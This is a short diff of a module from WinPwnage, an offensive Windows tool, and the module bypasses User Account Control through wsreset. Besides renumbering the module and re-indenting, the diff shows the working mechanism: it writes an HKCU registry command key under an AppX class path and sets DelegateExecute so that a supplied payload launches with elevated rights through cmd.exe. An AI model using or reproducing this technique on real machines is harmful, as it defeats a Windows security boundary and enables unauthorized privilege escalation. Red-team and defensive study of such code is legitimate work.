@@ -8,7 +8,7 @@ from winpwnage.core.utils import *
 
 wsreset_info = {
 	"Description": "Bypass UAC using wsreset and registry key manipulation",
-	"Id": "99",
+	"Id": "20",
 	"Type": "UAC bypass",
 	"Fixed In": "99999" if not information().uac_level() == 4 else "0",
 	"Works From": "17134",
@@ -31,9 +31,9 @@ def uac_wsreset(payload):
 		path = "Software\\Classes\\AppX82a6gwre4fdg3bt635tn5ctqjf8msdd2\\Shell\\open\\command"
 
 		if registry().modify_key(hkey="hkcu", path=path, name=None,
-								value="{cmd_path} /c start {payload}".format(
-								cmd_path=os.path.join(information().system_directory(),
-								"cmd.exe"), payload=payload), create=True):
+						value="{cmd_path} /c start {payload}".format(
+						cmd_path=os.path.join(information().system_directory(),
+						"cmd.exe"), payload=payload), create=True):
 			if registry().modify_key(hkey="hkcu", path=path, name="DelegateExecute", value=None, create=True):
 				print_success("Successfully created Default and DelegateExecute key containing payload ({payload})".format(payload=os.path.join(payload)))
 			else:
